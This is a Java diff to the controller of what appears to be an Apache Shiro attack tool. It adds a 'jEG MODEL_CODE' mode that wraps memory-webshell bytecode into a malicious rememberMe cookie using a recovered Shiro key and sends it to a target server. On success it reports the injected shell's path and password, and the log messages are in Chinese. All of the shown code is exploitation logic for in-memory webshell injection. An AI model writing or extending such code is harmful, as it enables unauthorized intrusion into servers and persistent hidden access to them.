@@ -503,6 +503,39 @@ public class MainController {
         AppLogger.info("内存马注入: type=" + memShellType + ", path=" + shellPath + ", dynamic=" + this.dynamicMemShellOpt.isSelected());
         MemBytes.setDynamicMode(this.dynamicMemShellOpt.isSelected());
         if (AttackService.gadget != null ) {
+            if (AttackService.jegMode) {
+                String b64Bytecode = MemBytes.getBytes(memShellType);
+                if (b64Bytecode == null || b64Bytecode.isEmpty()) {
+                    this.InjOutputArea.appendText(Utils.log("[异常] 未找到内存马模板: " + memShellType));
+                    return;
+                }
+                String srv = this.jegServerOpt.getValue();
+                if (srv == null || srv.isEmpty()) srv = "SERVER_TOMCAT";
+                String key = AttackService.realShiroKey;
+                EchoGenerateResult jegResult = this.attackService.generateEchoWithThirdParty(
+                        "jEG", srv, "MODEL_CODE", "FORMAT_BASE64",
+                        null, null, key, "", b64Bytecode);
+                if (jegResult.isSuccess() && jegResult.getPayload() != null) {
+                    String cookieLine = AttackService.resolveRememberMeCookieLine(jegResult.getPayload(), jegResult.getRequestHeaderName());
+                    if (cookieLine != null) {
+                        String result = this.attackService.sendRememberMeCookieExploitWithCmd(cookieLine, null, true, this.InjOutputArea);
+                        if (result != null && (result.contains("->|Success|<-") || result.contains("Filter already exists") || result.contains("Servlet already exists"))) {
+                            this.InjOutputArea.appendText(Utils.log("[注入结果] 成功 (jEG MODEL_CODE)"));
+                            this.InjOutputArea.appendText(Utils.log("[类型] " + memShellType));
+                            this.InjOutputArea.appendText(Utils.log("[路径] " + Utils.UrlToDomain(this.attackService.url) + shellPath));
+                            this.InjOutputArea.appendText(Utils.log("[密码] " + shellPass));
+                        } else {
+                            this.InjOutputArea.appendText(Utils.log("[注入结果] 失败，请更换注入类型或服务端类型"));
+                        }
+                    } else {
+                        this.InjOutputArea.appendText(Utils.log("[异常] jEG payload 无法转为 rememberMe Cookie"));
+                    }
+                } else {
+                    this.InjOutputArea.appendText(Utils.log("[异常] jEG MODEL_CODE 生成失败: " + (jegResult != null ? jegResult.getMessage() : "")));
+                }
+                this.InjOutputArea.appendText(Utils.log("-------------------------------------------------"));
+                return;
+            }
             this.attackService.injectMem(memShellType, shellPass, shellPath);
         } else {
             this.InjOutputArea.appendText(Utils.log("请先获取密钥和构造链"));
@@ -1943,7 +1976,7 @@ public class MainController {
                     "请在「指定Key」填写 Base64 key，或先爆破密钥成功。");
             return;
         }
-        this.memshellGeneratorOutput.appendText("[发送] 与「内存马注入」相同流程：InjectMemTool rememberMe Cookie + POST user=生成载荷 Base64\n");
+        this.memshellGeneratorOutput.appendText("[发送] " + (AttackService.jegMode ? "jEG MODEL_CODE 模式注入" : "InjectMemTool rememberMe Cookie + POST user=生成载荷 Base64") + "\n");
         String pass = this.shellPassText != null ? this.shellPassText.getText() : "";
         String path = this.shellPathText != null ? this.shellPathText.getText() : "";
         String memLabel;
@@ -1954,6 +1987,31 @@ public class MainController {
             memLabel = this.memShellOpt != null ? this.memShellOpt.getValue() : "传统模式内存马";
         }
         AppLogger.info("内存马 Shiro 注入: gadget=" + AttackService.gadget + ", path=" + path + ", label=" + memLabel);
+
+        if (AttackService.jegMode) {
+            String srv = this.jegServerOpt.getValue();
+            if (srv == null || srv.isEmpty()) srv = "SERVER_TOMCAT";
+            EchoGenerateResult jegResult = this.attackService.generateEchoWithThirdParty(
+                    "jEG", srv, "MODEL_CODE", "FORMAT_BASE64",
+                    null, null, key.trim(), "", this.lastMemshellExploitPayload);
+            if (jegResult.isSuccess() && jegResult.getPayload() != null) {
+                String cookieLine = AttackService.resolveRememberMeCookieLine(jegResult.getPayload(), jegResult.getRequestHeaderName());
+                if (cookieLine != null) {
+                    String result = this.attackService.sendRememberMeCookieExploitWithCmd(cookieLine, null, true, this.memshellGeneratorOutput);
+                    if (result != null) {
+                        this.memshellGeneratorOutput.appendText("[发送结果] 已收到响应，长度=" + result.length() + "\n");
+                    } else {
+                        this.memshellGeneratorOutput.appendText("[发送结果] 未收到有效响应\n");
+                    }
+                } else {
+                    this.memshellGeneratorOutput.appendText("[发送结果] jEG payload 无法转为 rememberMe Cookie\n");
+                }
+            } else {
+                this.memshellGeneratorOutput.appendText("[发送结果] jEG MODEL_CODE 生成失败: " + (jegResult.getMessage() != null ? jegResult.getMessage() : "未知错误") + "\n");
+            }
+            return;
+        }
+
         String result = this.attackService.sendInjectMemToolExploit(
                 AttackService.gadget,
                 key.trim(),
